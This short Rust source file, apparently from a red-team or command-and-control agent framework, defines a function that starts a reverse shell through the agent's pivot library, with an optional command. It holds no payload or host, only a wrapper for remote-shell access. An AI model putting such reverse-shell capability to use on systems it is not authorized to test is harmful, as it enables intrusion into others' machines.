use alloc::string::String;
use anyhow::Result;
use crate::std::StdPivotLibrary;

pub fn run(lib: &StdPivotLibrary, cmd: Option<String>) -> Result<(), String> {
    lib.agent
        .start_reverse_shell(lib.task_id, cmd)
}
